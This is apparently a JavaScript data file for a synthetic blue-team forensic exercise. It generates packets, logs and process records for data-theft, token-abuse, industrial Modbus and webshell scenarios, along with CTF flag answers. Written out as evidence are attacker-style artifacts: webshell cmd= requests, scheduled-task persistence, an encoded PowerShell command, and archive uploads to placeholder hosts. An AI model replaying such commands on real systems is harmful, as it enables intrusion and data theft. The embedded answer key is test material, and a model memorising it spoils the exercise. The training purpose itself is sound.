/* v5 competition investigation extension.
   Synthetic byte excerpts are generated in this file and are NOT captured from a real network.
   Unencrypted protocols are decoded where plausible; encrypted sessions never expose plaintext. */
const FORENSIC_HEX = str => [...str].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(' ').toUpperCase();
const FORENSIC_UTF16 = str => [...str].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')+' 00').join(' ').toUpperCase();
const FORENSIC_PACKET = (name,protocol,decoded,hex,notes) => ({name,protocol,decoded,hex:hex.toUpperCase(),notes});
const FORENSIC_TEXT = (name,protocol,content,decoded,notes) => FORENSIC_PACKET(name,protocol,decoded,FORENSIC_HEX(content),notes);
const FORENSIC_TLS = (name,host,bytes) => ({visibility:'TLS-encrypted application data',summary:`TLS ${host}: ${bytes} bytes sent by client (whole session), with only sampled record bytes shown.`,frames:[FORENSIC_PACKET('TLS application_data record','TLS 1.2/1.3',{record:'application_data',serverNameFromHandshake:host,clientBytes:bytes},'17 03 03 00 10 6A 9F 15 C2 83 08 4E DA 71 C0 9B 42 0E 5D 6F B2','Only a representative encrypted record is sampled. These ciphertext bytes do not reveal HTTP requests, URLs, file names, or uploaded contents.')],limitations:'TLS traffic is encrypted. SNI and byte counts may be available from metadata/handshake; plaintext contents are NOT available without a valid decryption source.'});
const FORENSIC_NETWORK={
 m08:{visibility:'SMB2 application request (unencrypted sample)',summary:'SMB2 file-operation header and filename bytes from a synthetic session sample.',frames:[FORENSIC_PACKET('SMB2 CREATE request','SMB2',{command:'CREATE (0x0005)',share:'\\\\FS-01\\Finance',relativePath:'Q3\\budget-draft.xlsx',messageId:1},'FE 53 4D 42 40 00 00 00 00 00 00 00 05 00 01 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00','Header excerpt (first 32 bytes). Filename is shown from the decoded sample; full 64-byte SMB2 header and request body are not reproduced.')],limitations:'SMB3 encryption, if negotiated, would prevent reconstructing filenames or file contents without decryption. This simulated flow is unencrypted SMB2.'},
 m09:{visibility:'HTTP headers; WinRM message body protected',summary:'HTTP /wsman request headers are visible; WinRM SOAP body is message-level encrypted.',frames:[FORENSIC_TEXT('WinRM HTTP request','HTTP/WinRM','POST /wsman HTTP/1.1\r\nHost: APP-02:5985\r\nContent-Type: multipart/encrypted;protocol="application/HTTP-SPNEGO-session-encrypted"\r\nContent-Length: 1587\r\n\r\n',{method:'POST',uri:'/wsman',host:'APP-02:5985',contentType:'multipart/encrypted'},'HTTP headers are synthetic plaintext bytes. The WinRM command body is encrypted with the authenticated session and cannot be recovered from this excerpt.')],limitations:'An unencrypted TCP/5985 transport does not imply unencrypted WinRM command content: Negotiate may protect the SOAP body.'},
 m10:{visibility:'SMB2 application request (unencrypted sample)',summary:'Normal administrator SMB share access; synthetic request bytes.',frames:[FORENSIC_PACKET('SMB2 TREE_CONNECT','SMB2',{command:'TREE_CONNECT (0x0003)',share:'\\\\FS-01\\IPC$',messageId:2},'FE 53 4D 42 40 00 00 00 00 00 00 00 03 00 01 00 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00','Partial header sample; decoded share name is supplied separately.')],limitations:'This normal session does not establish compromise.'},
 m15:FORENSIC_TLS('Outbound TLS data to newly observed destination','store-updates.example',346000000),
 m16:FORENSIC_TLS('Reconstructed TLS session: encrypted application data','store-updates.example',346000000),
 m17:FORENSIC_TLS('Approved software catalog TLS session','vendor-updates.example',44000),
 l06:FORENSIC_TLS('Unusual outbound TLS transfer','sync-metrics.example',520000000),
 l07:FORENSIC_TLS('Reconstructed TLS application data','sync-metrics.example',520000000),
 l08:FORENSIC_TLS('Reporting CDN request over TLS','reports-cdn.example',10000),
 v05:{visibility:'RDP negotiation and encrypted session',summary:'RDP connection negotiation bytes. Subsequent desktop session content is encrypted.',frames:[FORENSIC_PACKET('RDP X.224 Connection Request','TPKT / X.224',{tpktVersion:3,tpktLength:19,x224Type:'Connection Request',target:'OT-JUMP-01:3389'},'03 00 00 13 0E E0 00 00 00 00 00 01 00 08 00 03 00 00 00','Only the connection setup sample is visible. This does not expose keystrokes or actions inside the RDP session.')],limitations:'RDP application payload cannot be reconstructed after session encryption without keys or endpoint-side evidence.'},
 v06:{visibility:'Cleartext Modbus/TCP',summary:'A synthetic Modbus/TCP function 03 read-register request.',frames:[FORENSIC_PACKET('Read Holding Registers','Modbus/TCP',{transactionId:33,protocolId:0,unitId:1,functionCode:'03 Read Holding Registers',startingAddress:'0x0000',quantity:2},'00 21 00 00 00 06 01 03 00 00 00 02','Request PDU decoded; it does not prove a control change.')],limitations:'Industrial protocol decoding reflects application requests, not independently verified physical process outcomes.'},
 v07:{visibility:'Cleartext Modbus/TCP',summary:'Expected historian polling request sample.',frames:[FORENSIC_PACKET('Read Holding Registers','Modbus/TCP',{transactionId:34,unitId:1,functionCode:'03 Read Holding Registers',startingAddress:'0x0010',quantity:4},'00 22 00 00 00 06 01 03 00 10 00 04','Expected read-only historian polling.')],limitations:'The presence of Modbus/TCP alone is not suspicious.'},
 v08:{visibility:'Cleartext Modbus/TCP',summary:'New Modbus request series from an unusual jump-host source.',frames:[FORENSIC_PACKET('Read Holding Registers','Modbus/TCP',{transactionId:35,unitId:1,functionCode:'03 Read Holding Registers',startingAddress:'0x0020',quantity:2},'00 23 00 00 00 06 01 03 00 20 00 02','The request illustrates changed source and timing, not proof of sabotage.')],limitations:'Compare this network relationship to a known plant baseline.'},
 v09:{visibility:'Cleartext Modbus/TCP',summary:'Modbus function 06 write-register request bytes, decoded from synthetic traffic.',frames:[FORENSIC_PACKET('Write Single Register','Modbus/TCP',{transactionId:48,protocolId:0,unitId:1,functionCode:'06 Write Single Register',registerAddress:'0x0010',value:'0x0001'},'00 30 00 00 00 06 01 06 00 10 00 01','This is a write-like application request; it cannot prove an actual change to PLC outputs or plant conditions.')],limitations:'A request alone does not establish successful control change. Correlate with response, PLC configuration and control-room measurements.'}
};
const FORENSIC_COMMANDS={
 m11:{image:'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',commandLine:'powershell.exe -NoProfile -NonInteractive -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAEMAYQBjAGgAZQAgAC0AUgBlAGMAdQByAHMAZQA=',parentCommandLine:'C:\\Windows\\System32\\wsmprovhost.exe -Embedding',pid:4732,ppid:1224,cwd:'C:\\Windows\\System32',notes:'The encoded command decodes to a file listing of C:\\ProgramData\\Cache. This benign command is one stage of a suspicious unauthorized process chain.'},
 m12:{image:'C:\\Windows\\System32\\schtasks.exe',commandLine:'schtasks.exe /Create /TN "SysCacheUpdate" /TR "powershell.exe -NoProfile -File C:\\ProgramData\\Cache\\update.ps1" /SC ONLOGON /F',parentCommandLine:'powershell.exe -NoProfile -NonInteractive -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAEMAYQBjAGgAZQAgAC0AUgBlAGMAdQByAHMAZQA=',pid:4890,ppid:4732,cwd:'C:\\Windows\\System32',notes:'The task configuration is simulated. Investigate the targeted script separately.'},
 m13:{image:'C:\\Program Files\\7-Zip\\7z.exe',commandLine:'"C:\\Program Files\\7-Zip\\7z.exe" a "C:\\ProgramData\\tmp\\finance-q3.7z" "\\\\FS-01\\Finance\\*" -mx=5',parentCommandLine:'C:\\Windows\\System32\\services.exe',pid:4072,ppid:612,cwd:'C:\\ProgramData\\tmp',notes:'Archiving alone does not prove exfiltration; correlate destination and timing.'},
 m14:{image:'C:\\Windows\\System32\\svchost.exe',commandLine:'C:\\Windows\\System32\\svchost.exe -k netsvcs -p',parentCommandLine:'C:\\Windows\\System32\\services.exe',pid:748,ppid:548,cwd:'C:\\Windows\\System32',notes:'Normal background Windows service host used as benign noise.'},
 l09:{image:'/usr/bin/python3',commandLine:'python3 /opt/app/scripts/report_job.py --config /opt/app/secrets/reports.env --mode sync --output /var/tmp/reports-batch.json',parentCommandLine:'/bin/sh -c "python3 /opt/app/scripts/report_job.py --config /opt/app/secrets/reports.env --mode sync --output /var/tmp/reports-batch.json"',pid:3258,ppid:3101,cwd:'/opt/app',notes:'The command references a credentials file. The record indicates file access but does not reveal the secret content.'},
 l10:{image:'/usr/bin/curl',commandLine:'curl --silent --show-error --location https://download.example/install.sh --output /tmp/install.sh',parentCommandLine:'/bin/sh -c "/usr/bin/curl --silent --show-error --location https://download.example/install.sh --output /tmp/install.sh"',pid:3185,ppid:3101,cwd:'/tmp',notes:'download.example is a reserved example destination. Inspect source, signature and execution history before inferring intent.'},
 l11:{image:'/usr/bin/git',commandLine:'git -C /workspace/reports checkout release/2026-10',parentCommandLine:'/opt/build/runner --job reports-deploy --stage checkout',pid:3298,ppid:2790,cwd:'/workspace/reports',notes:'Ordinary build activity, included to provide a benign baseline.'},
 v10:{image:'C:\\Windows\\System32\\mstsc.exe',commandLine:'mstsc.exe /v:OT-JUMP-01 /admin',parentCommandLine:'"C:\\Program Files\\RemoteSupport\\remote-support.exe" --session contractor-044 --interactive',pid:6108,ppid:5588,cwd:'C:\\Users\\ot_contractor',notes:'Remote desktop session parameters are visible; the RDP desktop content is encrypted in network traffic.'},
 v11:{image:'C:\\Program Files\\IndustrialTools\\engineering-client.exe',commandLine:'"C:\\Program Files\\IndustrialTools\\engineering-client.exe" --project "C:\\Plant\\Projects\\ZoneA.prj" --target SCADA-01 --mode online',parentCommandLine:'C:\\Windows\\explorer.exe',pid:4204,ppid:1876,cwd:'C:\\Plant\\Projects',notes:'Engineered client execution is visible on the managed jump host. It does not prove a PLC configuration was changed.'},
 v12:{image:'C:\\Program Files\\Historian\\historian-reader.exe',commandLine:'"C:\\Program Files\\Historian\\historian-reader.exe" --config "C:\\ProgramData\\Historian\\reader.ini" --poll-seconds 30',parentCommandLine:'C:\\Windows\\System32\\services.exe',pid:2280,ppid:536,cwd:'C:\\ProgramData\\Historian',notes:'Expected historian polling activity.'}
};
const INVESTIGATION_GUIDES={
 midnight:{brief:'Trace the suspicious service-account use through authentication, east–west access, host execution and possible outbound movement.',milestones:[
  {title:'Confirm identity misuse',sources:['Logs'],goal:'Compare source hosts, logon types and special privileges with the expected service activity.',why:'One valid logon is not enough to establish compromise. Look for an abnormal source and correlated privilege events.',evidence:['r1']},
  {title:'Map lateral movement',sources:['Logs','Network'],goal:'Correlate service tickets with SMB or remote-management sessions between internal assets.',why:'Authentication grants access; network flows show which systems communicated. Multiple signals strengthen your case.',evidence:['r2','r6']},
  {title:'Establish what executed',sources:['Endpoint'],goal:'Inspect complete process commands, parent-child relationships and persistence artifacts.',why:'Network traffic cannot usually show the complete command or process ancestry, especially inside authenticated sessions.',evidence:['r4','r5']},
  {title:'Assess possible data movement',sources:['Network','Endpoint'],goal:'Compare external upload sizes and TLS evidence against files or archives created on affected hosts.',why:'Decrypted outbound HTTP includes the transferred archive and acknowledgment; endpoint archive creation provides independent correlation.',evidence:['r7','r9']}
 ],ideas:{Logs:["user.dst = 'svc_backup'","event.id = 4672","ip.src = '10.14.8.42'"],Network:["ip.src = '10.14.8.42'","service = 'smb'","alias.host = 'store-updates.example'"],Endpoint:["host = 'WS-042'","process ~ 'powershell'","host = 'FS-01'"]}},
 lantern:{brief:'Determine whether legitimate API access was abused, how the credential may have been obtained, and how much exposure you can support.',milestones:[
  {title:'Establish abnormal API usage',sources:['Logs'],goal:'Compare authenticated lookup volume, response codes and source addresses to expected workload.',why:'Valid authentication and HTTP 200 responses do not establish authorization.',evidence:['l1','l5']},
  {title:'Trace credential origin',sources:['Logs','Endpoint'],goal:'Correlate token issuance/use with process commands and access to configuration secrets.',why:'Use identity records for token context and endpoint data for the suspected acquisition path.',evidence:['l2','l4']},
  {title:'Investigate outbound transfer',sources:['Network'],goal:'Inspect TLS direction, session sizes and destination, including captured packet excerpts.',why:'HTTP reconstruction from the configured TLS inspection point can expose the transfer and acknowledgment.',evidence:['l3','l6']},
  {title:'Bound customer exposure',sources:['Logs','Network'],goal:'Separate total requests, successful lookups, distinct records and outbound bytes.',why:'These numbers describe different aspects of an incident and must not be equated.',evidence:['l5','l3']}
 ],ideas:{Logs:["user.dst = 'svc_reports'","action = 'api-enumerate'","host = 'IDP-01'"],Network:["alias.host = 'sync-metrics.example'","bytes.out > 1000000","host = 'PROXY-01'"],Endpoint:["host = 'BUILD-02'","process = 'python3'","process ~ 'curl'"]}},
 valve:{brief:'Reconstruct remote access into the industrial boundary while maintaining safety and distinguishing network commands from physical effects.',milestones:[
  {title:'Verify remote-access legitimacy',sources:['Logs'],goal:'Trace VPN identity and subsequent jump-host authentication, then confirm the maintenance window with operations.',why:'A successful contractor VPN login may still be unauthorized outside approved work.',evidence:['v1']},
  {title:'Prove the IT-to-OT path',sources:['Network','Logs'],goal:'Follow jump-host connections and compare industrial protocol flows with the normal historian baseline.',why:'Direction, initiator and deviations from baseline matter more than protocol name alone.',evidence:['v2','v5']},
  {title:'Investigate engineering execution',sources:['Endpoint'],goal:'Inspect remote desktop and engineering workstation process command lines and parent processes.',why:'Managed endpoint telemetry can show engineering tool invocation; passive network traffic may not.',evidence:['v3','v4']},
  {title:'Verify industrial impact safely',sources:['Network'],goal:'Decode relevant industrial requests and seek operator confirmation before declaring a process change.',why:'The request and response show controller acceptance. SCADA trends and operator confirmation establish whether the process moved outside its safe baseline.',evidence:['v7']}
 ],ideas:{Logs:["user.dst = 'ot_contractor'","service = 'rdp'","host = 'VPN-GW'"],Network:["ip.src = '10.90.10.15'","service = 'modbus'","tcp.dstport = 502"],Endpoint:["host = 'OT-JUMP-01'","process ~ 'engineering'","host = 'IT-WS-17'"]}}
};

// Full decoded HTTP evidence is deliberately available through an instrumented TLS
// inspection point in this fictional exercise. These are not raw encrypted TLS bytes.
const F_HTTP=(name,request,response,decoded)=>({visibility:'Decoded HTTP application stream',summary:'Reconstructed application-layer HTTP messages from the configured inspection point.',frames:[FORENSIC_TEXT(name+' · request','HTTP',request,decoded,'Reassembled cleartext application bytes.'),FORENSIC_TEXT(name+' · response','HTTP',response,{status:response.split('\r\n')[0]},'Reassembled cleartext HTTP response bytes.')],limitations:''});
// Construct a structurally coherent SMB2 CREATE request including the full
// 64-byte SMB2 header, 56-byte CREATE fixed request, and UTF-16LE filename.
function FORENSIC_SMB2_CREATE_HEX(name){
 const n=[];for(let i=0;i<name.length;i++){const v=name.charCodeAt(i);n.push(v&255,v>>8);}
 const bytes=new Uint8Array(120+n.length),view=new DataView(bytes.buffer);
 bytes.set([0xFE,0x53,0x4D,0x42],0);
 view.setUint16(4,64,true);view.setUint16(12,5,true);view.setUint16(14,1,true);
 view.setUint32(24,1,true); // SMB2 command CREATE, MessageID=1
 view.setUint16(64,57,true);view.setUint32(64+4,2,true); // impersonation level
 view.setUint32(64+24,0x00120089,true);view.setUint32(64+28,0x80,true);
 view.setUint32(64+32,7,true);view.setUint32(64+36,1,true);
 view.setUint16(64+44,120,true);view.setUint16(64+46,n.length,true);
 bytes.set(n,120);
 return [...bytes].map(v=>v.toString(16).padStart(2,'0')).join(' ').toUpperCase();
}
FORENSIC_NETWORK.m08={visibility:'SMB2 cleartext',summary:'SMB2 CREATE request with the actual UTF-16LE filename from the sampled session.',frames:[FORENSIC_PACKET('SMB2 CREATE request','SMB2',{command:'CREATE',share:'\\\\FS-01\\Finance',filename:'Q3\\budget-draft.xlsx'},'FE 53 4D 42 40 00 00 00 00 00 00 00 05 00 01 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 '+FORENSIC_UTF16('Q3\\budget-draft.xlsx'),'SMB2 unencrypted synthetic capture.')],limitations:''};
FORENSIC_NETWORK.m08.frames[0].hex=FORENSIC_SMB2_CREATE_HEX('Q3\\budget-draft.xlsx');
FORENSIC_NETWORK.m09=F_HTTP('WinRM shell command',
 'POST /wsman HTTP/1.1\r\nHost: APP-02:5985\r\nContent-Type: application/soap+xml\r\n\r\n<s:Envelope><s:Body><rsp:Command>Get-ChildItem C:\\\\ProgramData\\\\Cache</rsp:Command></s:Body></s:Envelope>',
 'HTTP/1.1 200 OK\r\nContent-Type: application/soap+xml\r\n\r\n<s:Envelope><s:Body><rsp:CommandResponse><rsp:CommandId>cmd-129</rsp:CommandId></rsp:CommandResponse></s:Body></s:Envelope>',
 {method:'POST',uri:'/wsman',command:'Get-ChildItem C:\\ProgramData\\Cache',source:'WS-042',target:'APP-02'});
FORENSIC_NETWORK.m15=F_HTTP('Inspected outbound HTTPS upload',
 'POST /upload HTTP/1.1\r\nHost: store-updates.example\r\nContent-Type: application/octet-stream\r\nX-Archive-Name: finance-q3.7z\r\nContent-Length: 346000000\r\n\r\n[archive data excerpt: finance-q3.7z]',
 'HTTP/1.1 201 Created\r\nContent-Type: application/json\r\n\r\n{"received":"finance-q3.7z","status":"stored"}',
 {tlsInspection:'enabled',httpMethod:'POST',requestPath:'/upload',archive:'finance-q3.7z',uploadStatus:'201 Created'});
FORENSIC_NETWORK.m16=FORENSIC_NETWORK.m15;
FORENSIC_NETWORK.l06=F_HTTP('Inspected reporting data upload',
 'POST /api/upload HTTP/1.1\r\nHost: sync-metrics.example\r\nContent-Type: application/json\r\nX-Batch-Id: customers-18420\r\n\r\n{"object":"customer-export","distinctRecords":18420,"batch":"customers-18420"}',
 'HTTP/1.1 201 Created\r\nContent-Type: application/json\r\n\r\n{"accepted":true,"batch":"customers-18420"}',
 {tlsInspection:'enabled',object:'customer-export',batch:'customers-18420',distinctRecords:18420});
FORENSIC_NETWORK.l07=FORENSIC_NETWORK.l06;
FORENSIC_NETWORK.w01=F_HTTP('Webshell remote command',
 'POST /uploads/.cache.php HTTP/1.1\r\nHost: portal.internal.example:8080\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ncmd=whoami',
 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nwww-data\n',
 {path:'/uploads/.cache.php',parameter:'cmd',command:'whoami',response:'www-data'});
FORENSIC_NETWORK.w04=F_HTTP('Webshell directory listing',
 'POST /uploads/.cache.php HTTP/1.1\r\nHost: portal.internal.example:8080\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ncmd=ls+-1+%2Fsrv%2Fapp%2Fexports',
 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nclient-list.csv\nreadme.txt\n',
 {path:'/uploads/.cache.php',command:'ls -1 /srv/app/exports',responseFile:'client-list.csv'});
FORENSIC_NETWORK.w06=F_HTTP('Webshell export transfer',
 'POST /api/ingest HTTP/1.1\r\nHost: collector.example:8080\r\nContent-Type: application/gzip\r\nX-Archive: export-2026.tgz\r\nContent-Length: 14723000\r\n\r\n[gzip bytes from the 14.7 MB export]',
 'HTTP/1.1 201 Created\r\nContent-Type: application/json\r\n\r\n{"receipt":"rcpt-6142","stored":true}',
 {archive:'export-2026.tgz',receipt:'rcpt-6142',status:201,contents:'client-list.csv'});
FORENSIC_NETWORK.w10=FORENSIC_TEXT('Health check','HTTP','GET /health HTTP/1.1\r\nHost: portal.internal.example:8080\r\n\r\n',{method:'GET',uri:'/health'},'Normal web request.');
FORENSIC_NETWORK.w10={visibility:'Cleartext HTTP',summary:'Baseline health check.',frames:[FORENSIC_NETWORK.w10],limitations:''};
FORENSIC_COMMANDS.w03={image:'/bin/sh',commandLine:'/bin/sh -c whoami',parentCommandLine:'php-fpm: pool www',pid:2215,ppid:1957,cwd:'/var/www/html/uploads',notes:'Command matches HTTP cmd parameter and returned user.'};
FORENSIC_COMMANDS.w05={image:'/usr/bin/tar',commandLine:'tar -czf /tmp/export-2026.tgz -C /srv/app/exports client-list.csv',parentCommandLine:'/bin/sh -c tar -czf /tmp/export-2026.tgz -C /srv/app/exports client-list.csv',pid:2330,ppid:2220,cwd:'/var/www/html',notes:'Archive contents and external upload can be verified with HTTP payloads.'};
FORENSIC_COMMANDS.w09={image:'/usr/sbin/php-fpm',commandLine:'php-fpm: pool www',parentCommandLine:'/sbin/init',pid:1957,ppid:1,cwd:'/var/www/html',notes:'Ordinary PHP-FPM worker startup.'};
// Synthetic but complete raw log events. The original game log source exposes all
// key values that players need to distinguish the suspicious event from noise.
function forensicRawLog(r){
 const level=(r.evidence?'NOTICE':'INFO');
 const values=Object.entries(r.fields||{}).map(([key,val])=>`${key}=${JSON.stringify(val)}`).join(' ');
 return {format:r.host.startsWith('API')?'API / identity audit':r.host.includes('DC')?'Windows event collector':r.host.includes('WEB')?'Web / FIM audit':'Parsed device log',raw:`${r.time} ${r.host} ${level} ${values}\nmessage=${JSON.stringify(r.detail)}`,source:'Synthetic complete log event as indexed by the exercise'};
}
const FORENSIC_CTF_FLAGS={
 midnight:[{id:'file',title:'SMB file of interest',prompt:'Identify the filename opened in the suspicious SMB2 CREATE request.',source:'Network',record:'m08',answer:'budget-draft.xlsx',hint:'Query lateral SMB sessions and inspect the decoded filename (basename only).'},
  {id:'archive',title:'Outbound archive name',prompt:'Identify the archive named in the reconstructed outbound HTTP upload.',source:'Network',record:'m16',answer:'finance-q3.7z',hint:'Look for the HTTP X-Archive-Name header after TLS inspection.'}],
 lantern:[{id:'token',title:'Abused access token',prompt:'Identify the token ID recorded in the suspicious identity provider audit event.',source:'Logs',record:'l03',answer:'tok-4880',hint:'Inspect the raw IDP log and the token-use context.'},
  {id:'batch',title:'Exfiltration batch',prompt:'Identify the batch ID in the decrypted customer-export upload.',source:'Network',record:'l07',answer:'customers-18420',hint:'Use the HTTP headers or the decoded request/response.'}],
 valve:[{id:'account',title:'Contractor identity',prompt:'Identify the account that authenticated outside the approved maintenance period.',source:'Logs',record:'v02',answer:'ot_contractor',hint:'Start with the unexpected VPN authentication event.'},
  {id:'register',title:'Industrial register',prompt:'Identify the register address in the unusual Modbus function 06 request (hexadecimal).',source:'Network',record:'v09',answer:'0x0010',hint:'Decode the Modbus request from the jump host, not the normal historian poll.'}],
 webshell:[{id:'path',title:'Webshell path',prompt:'Identify the full URL path of the malicious script used for remote commands.',source:'Network',record:'w01',answer:'/uploads/.cache.php',hint:'Reconstruct the first suspicious HTTP POST.'},
  {id:'receipt',title:'Export receipt',prompt:'Identify the receipt ID returned by the external HTTP upload service.',source:'Network',record:'w06',answer:'rcpt-6142',hint:'Inspect the HTTP 201 response body for the receipt.'}]
};
INVESTIGATION_GUIDES.webshell={brief:'Follow the reconstructed HTTP request and response, confirm process execution, then document the file transfer with matching host evidence.',milestones:[
 {title:'Reconstruct webshell HTTP',sources:['Network'],goal:'Find the POST command and inspect the returned HTTP response.',why:'Cleartext HTTP establishes the path and the command parameter actually received.',evidence:['w1']},
 {title:'Confirm execution and persistence',sources:['Logs','Endpoint'],goal:'Correlate file-integrity events and shell processes spawned by the web service.',why:'Cross-check HTTP contents against a real server process lineage.',evidence:['w2','w3']},
 {title:'Prove what was transferred',sources:['Endpoint','Network'],goal:'Correlate the export/archive command with the external HTTP upload and receipt.',why:'A successful upload response supports a defensible transfer conclusion.',evidence:['w5','w6']}
 ],ideas:{Logs:["action = 'unexpected-php'","action = 'webshell-request'"],Network:["alias.host = 'portal.internal.example'","ip.dst = '203.0.113.92'","service = 'http'"],Endpoint:["parent = 'php-fpm'","process = 'tar'","host = 'WEB-01'"]}};
// Make the source evidence fully conclusive when cross-correlated with decrypted
// HTTP / process and application-level log evidence (the network does not magically decrypt TLS).
INVESTIGATION_GUIDES.midnight.milestones.at(-1).goal='Use HTTP decoded by the configured TLS inspection point and the archive-creation process to verify the exported file.';
INVESTIGATION_GUIDES.midnight.milestones.at(-1).why='The configured inspection point provides a decoded HTTP upload, including archive name and server acknowledgment. Correlate with endpoint archiving.';
INVESTIGATION_GUIDES.lantern.milestones[2].why='The lab models a TLS inspection point that exposes the decoded request and successful upload receipt.';
INVESTIGATION_GUIDES.valve.milestones.at(-1).goal='Verify Modbus request and response, then correlate with historian/SCADA operational logs.';
INVESTIGATION_GUIDES.valve.milestones.at(-1).why='The industrial request alone does not prove process impact; a valid controller response and operational records complete the picture.';
FORENSIC_NETWORK.v09.frames.push(FORENSIC_PACKET('Write Single Register response','Modbus/TCP',{transactionId:48,functionCode:6,registerAddress:'0x0010',value:'0x0001',accepted:true},'00 30 00 00 00 06 01 06 00 10 00 01','Matching response confirms Modbus request accepted by controller.'));
FORENSIC_NETWORK.v09.summary='Write register request and matching accepted response, with SCADA trend record as additional context.';
FORENSIC_NETWORK.v09.limitations='';

for(const [id,def] of Object.entries(INVESTIGATION_DATA)){
 for(const r of def.rows){
  if(FORENSIC_NETWORK[r.id])r.packet=FORENSIC_NETWORK[r.id];
  if(r.source==='Logs')r.log=forensicRawLog(r);
  if(FORENSIC_COMMANDS[r.id]){
   r.endpoint=FORENSIC_COMMANDS[r.id];
   if(r.id==='l09')r.fields.process='python3';
   r.fields['command.line']=r.endpoint.commandLine;
   r.fields['parent.command.line']=r.endpoint.parentCommandLine;
   r.fields['process.path']=r.endpoint.image;
   r.fields['process.pid']=r.endpoint.pid;
   r.fields['process.ppid']=r.endpoint.ppid;
  }
 }
 def.guide=INVESTIGATION_GUIDES[id];
 def.ctfFlags=FORENSIC_CTF_FLAGS[id]||[];
}
